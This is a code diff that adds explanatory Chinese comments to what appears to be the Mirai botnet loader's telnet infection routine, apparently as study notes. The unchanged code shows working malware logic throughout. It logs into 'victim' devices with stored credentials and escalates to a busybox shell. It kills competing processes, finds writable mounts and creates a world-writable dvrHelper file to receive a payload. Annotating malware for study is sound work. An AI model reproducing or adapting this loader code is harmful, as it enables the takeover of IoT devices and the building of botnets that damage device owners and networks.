@@ -144,7 +144,7 @@ void server_telnet_probe(struct server *srv, struct telnet_info *info)
         printf("srv == NULL 4\n");
 
     conn = srv->estab_conns[fd];    //也就是本地的socket标识符是srv的connection数组的下标
-    memcpy(&conn->info, info, sizeof (struct telnet_info)); //把新的感染节点的info复制到&conn->info中
+    memcpy(&conn->info, info, sizeof (struct telnet_info)); //把新的感染节点的info复制到&conn->info中【存储了user，pw】
     conn->srv = srv;
     conn->fd = fd;      //和victim连接的本地socket fd
     connection_open(conn);  //初始化conn的其他参数【状态改为TELNET_CONNECTING】
@@ -159,8 +159,9 @@ void server_telnet_probe(struct server *srv, struct telnet_info *info)
     }
     //成功连接，将server的socket fd加入epoll。用于处理server向victim的读写
     event.data.fd = fd;
-    event.events = EPOLLOUT;    //告诉内核需要监听这个fd的什么事件：允许对这个fd写
-    //也就是说，如果victim对这个fd写了【也就是server传输命令，victim回显结果的时候】，就会触发这个event
+    event.events = EPOLLOUT;    //告诉内核需要监听这个fd的什么事件：允许对这个fd写【server可以对这个fd写命令给victim执行】
+    //相反，如果victim对这个fd写了【也就是server传输命令，victim回显结果的时候】，就会触发这个event EPOLLIN【允许对这个fd读】
+    
     //从之前选中的处理当前新增感染节点的worker的epoll【wrker->efd】中加入【EPOLL_CTL_ADD】当前需要处理的用于通信的fd【这个fd用于反馈victim的交互情况】
     epoll_ctl(wrker->efd, EPOLL_CTL_ADD, fd, &event);   //增删改epoll中的fd：https://man7.org/linux/man-pages/man2/epoll_ctl.2.html
 }
@@ -200,9 +201,24 @@ static void *worker(void *arg)
 }
 
 //事件处理
+/*
+The struct epoll_event is defined as:
+           typedef union epoll_data {
+               void    *ptr;
+               int      fd;
+               uint32_t u32;
+               uint64_t u64;
+           } epoll_data_t;
+
+           struct epoll_event {
+               uint32_t     events;    // Epoll events
+               epoll_data_t data;      // User data variable 
+           };
+*/         
 static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 {
-    struct connection *conn = wrker->srv->estab_conns[ev->data.fd];
+    //ev->data.fd为触发这个事件的本地socket fd
+    struct connection *conn = wrker->srv->estab_conns[ev->data.fd]; //找到对应的conn结构体
 
     if (conn->fd == -1)
     {
@@ -215,7 +231,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
     {
         printf("yo socket mismatch\n");
     }
-
+    //查看是否是本地的处理victim的fd有错误
     // Check if there was an error
     if (ev->events & EPOLLERR || ev->events & EPOLLHUP || ev->events & EPOLLRDHUP)
     {
@@ -228,13 +244,13 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
     }
 
     // Are we ready to write?
-    if (conn->state_telnet == TELNET_CONNECTING && ev->events & EPOLLOUT)
+    if (conn->state_telnet == TELNET_CONNECTING && ev->events & EPOLLOUT)   //是和victim连接的初始状态。然后当前的事件允许对这个本地fd写
     {
         struct epoll_event event;
 
         int so_error = 0;
         socklen_t len = sizeof(so_error);
-        getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &so_error, &len);
+        getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &so_error, &len);    //判断这个socket上是否有错误
         if (so_error)
         {
 #ifdef DEBUG
@@ -248,9 +264,16 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
         printf("[FD%d] Established connection\n", ev->data.fd);
 #endif
         event.data.fd = conn->fd;
-        event.events = EPOLLIN | EPOLLET;
-        epoll_ctl(wrker->efd, EPOLL_CTL_MOD, conn->fd, &event);
-        conn->state_telnet = TELNET_READ_IACS;
+        //EPOLLIN:The associated file is available for read(2) operations.
+        //EPOLLET：Requests edge-triggered notification for the associated file descriptor.
+        //EPOLLET模式通常来说是用于非阻塞模式，避免读或写被阻塞导致的饿死的。【边缘触发，只在状态发生转移的时候，通知一次】
+        //如果写了pipe的一端，另外一端使用了EPOLLET，那么只通过event读取一次，即使没有读完，也不会产生新的event了。【edge-triggered】
+        //如果是状态触发，如果没有读完，还会继续产生event通知。
+        //https://www.cnblogs.com/liloke/archive/2011/04/12/2014205.html
+        //与其相反的是Level-triggered【差异在于：https://man7.org/linux/man-pages/man7/epoll.7.html】
+        event.events = EPOLLIN | EPOLLET;   
+        epoll_ctl(wrker->efd, EPOLL_CTL_MOD, conn->fd, &event);     //重新放入epoll，等待需要读取的事件【即victim回显】
+        conn->state_telnet = TELNET_READ_IACS;  //进入读取IACS状态。
         conn->timeout = 30;
     }
 
@@ -260,13 +283,13 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
     }
 
     // Is there data to read?
-    if (ev->events & EPOLLIN && conn->open)
+    if (ev->events & EPOLLIN && conn->open) //如果当前事件是读取本地fd的事件。
     {
         int ret;
 
-        conn->last_recv = time(NULL);
+        conn->last_recv = time(NULL);   //记录上次读取时间
         while (TRUE)
-        {
+        {   //读取缓冲区还可以接收的长度。
             ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, sizeof (conn->rdbuf) - conn->rdbuf_pos, MSG_NOSIGNAL);
             if (ret <= 0)
             {
@@ -283,101 +306,103 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 #ifdef DEBUG
             printf("TELIN: %.*s\n", ret, conn->rdbuf + conn->rdbuf_pos);
 #endif
-            conn->rdbuf_pos += ret;
+            conn->rdbuf_pos += ret;     
             conn->last_recv = time(NULL);
 
-            if (conn->rdbuf_pos > 8196)
+            if (conn->rdbuf_pos > 8196)     
 			{
                 printf("oversized buffer pointer!\n");
 				abort();
 			}
 
-            while (TRUE)
+            while (TRUE)        //根据当前状态，决定如何解析/处理读取的结果
             {
                 int consumed;
 
-                switch (conn->state_telnet)
+                switch (conn->state_telnet) //注意这个state表示下一个应该达到的状态。
                 {
-                    case TELNET_READ_IACS:
+                    case TELNET_READ_IACS:  //TELNET_CONNECTING状态之后是TELNET_READ_IACS状态。故此时是第一次受到victim的回复。先进行IACS配置商议。
                         consumed = connection_consume_iacs(conn);
                         if (consumed)
-                            conn->state_telnet = TELNET_USER_PROMPT;
+                            conn->state_telnet = TELNET_USER_PROMPT;    //进入TELNET_USER_PROMPT状态
                         break;
                     case TELNET_USER_PROMPT:
-                        consumed = connection_consume_login_prompt(conn);
+                        consumed = connection_consume_login_prompt(conn);   
                         if (consumed)
                         {
-                            util_sockprintf(conn->fd, "%s", conn->info.user);
+                            util_sockprintf(conn->fd, "%s", conn->info.user);   //如果是收到login的提示，先把之前存储好的conn信息中的username发送给victim
                             strcpy(conn->output_buffer.data, "\r\n");
-                            conn->output_buffer.deadline = time(NULL) + 1;
-                            conn->state_telnet = TELNET_PASS_PROMPT;
+                            conn->output_buffer.deadline = time(NULL) + 1;  //更新out_buffer的时间【表示了上一次输出的时间】，而conn->last_recv表示上一次收到的时间。
+                            conn->state_telnet = TELNET_PASS_PROMPT;    //进入输入密码的阶段
                         }
                         break;
                     case TELNET_PASS_PROMPT:
                         consumed = connection_consume_password_prompt(conn);
                         if (consumed)
                         {
-                            util_sockprintf(conn->fd, "%s", conn->info.pass);
+                            util_sockprintf(conn->fd, "%s", conn->info.pass);   //输入密码
                             strcpy(conn->output_buffer.data, "\r\n");
                             conn->output_buffer.deadline = time(NULL) + 1;
                             conn->state_telnet = TELNET_WAITPASS_PROMPT; // At the very least it will print SOMETHING
                         }
                         break;
-                    case TELNET_WAITPASS_PROMPT:
+                    case TELNET_WAITPASS_PROMPT:        //等待登录成功，激活shell提示符
                         if ((consumed = connection_consume_prompt(conn)) > 0)
                         {
-                            util_sockprintf(conn->fd, "enable\r\n");
+                            util_sockprintf(conn->fd, "enable\r\n");    
                             util_sockprintf(conn->fd, "shell\r\n");
                             util_sockprintf(conn->fd, "sh\r\n");
                             conn->state_telnet = TELNET_CHECK_LOGIN;
                         }
                         break;
                     case TELNET_CHECK_LOGIN:
-                        if ((consumed = connection_consume_prompt(conn)) > 0)
+                        if ((consumed = connection_consume_prompt(conn)) > 0)   //检测登录成功，收到shell提示符
                         {
-                            util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
+                            util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");  //发送/bin/busybox ECCHI
                             conn->state_telnet = TELNET_VERIFY_LOGIN;
                         }
                         break;
                     case TELNET_VERIFY_LOGIN:
-                        consumed = connection_consume_verify_login(conn);
+                        consumed = connection_consume_verify_login(conn);   //判断有没有回复ECCHI: applet not found
                         if (consumed)
                         {
-                            ATOMIC_INC(&wrker->srv->total_logins);
+                            ATOMIC_INC(&wrker->srv->total_logins);  //增加server总的成功登录次数
 #ifdef DEBUG
                             printf("[FD%d] Succesfully logged in\n", ev->data.fd);
 #endif
-                            util_sockprintf(conn->fd, "/bin/busybox ps; " TOKEN_QUERY "\r\n");
+                            util_sockprintf(conn->fd, "/bin/busybox ps; " TOKEN_QUERY "\r\n");  //执行ps命令
                             conn->state_telnet = TELNET_PARSE_PS;
                         }
                         break;
                     case TELNET_PARSE_PS:
-                        if ((consumed = connection_consume_psoutput(conn)) > 0)
-                        {
-                            util_sockprintf(conn->fd, "/bin/busybox cat /proc/mounts; " TOKEN_QUERY "\r\n");
+                        if ((consumed = connection_consume_psoutput(conn)) > 0)  //解析ps命令的输出，kill带有init字符的进程【除了init进程本身】，以及以数字命名的进程
+                        {   //这里才会有memmove覆盖rdbuf
+                            util_sockprintf(conn->fd, "/bin/busybox cat /proc/mounts; " TOKEN_QUERY "\r\n");    //执行mounts命令，查看挂载的文件系统
                             conn->state_telnet = TELNET_PARSE_MOUNTS;
                         }
                         break;
                     case TELNET_PARSE_MOUNTS:
-                        consumed = connection_consume_mounts(conn);
+                        consumed = connection_consume_mounts(conn); //解析cat /proc/mounts的结果，将[“kami”+rw的文件系统路径]写到./文件系统根目录/nippon文件中，并且cat这个文件【回显会被传回到mirai】
                         if (consumed)
                             conn->state_telnet = TELNET_READ_WRITEABLE;
                         break;
                     case TELNET_READ_WRITEABLE:
-                        consumed = connection_consume_written_dirs(conn);
+                        consumed = connection_consume_written_dirs(conn);   //记录了当前登录用户允许读写的目录
                         if (consumed)
                         {
 #ifdef DEBUG
                             printf("[FD%d] Found writeable directory: %s/\n", ev->data.fd, conn->info.writedir);
 #endif
-                            util_sockprintf(conn->fd, "cd %s/\r\n", conn->info.writedir, conn->info.writedir);
+                            util_sockprintf(conn->fd, "cd %s/\r\n", conn->info.writedir, conn->info.writedir);  //切换到可读写的目录中，准备传输payload
+                            //> file :创建文件名为file的文件
+                            //创建dvrHelper文件，将该文件的权限修改为777【rwx】
                             util_sockprintf(conn->fd, "/bin/busybox cp /bin/echo " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n");
                             conn->state_telnet = TELNET_COPY_ECHO;
                             conn->timeout = 120;
                         }
                         break;
-                    case TELNET_COPY_ECHO:
-                        consumed = connection_consume_copy_op(conn);
+                    case TELNET_COPY_ECHO:                              
+                        consumed = connection_consume_copy_op(conn);    //判断上述命令成功执行了。
                         if (consumed)
                         {
 #ifdef DEBUG
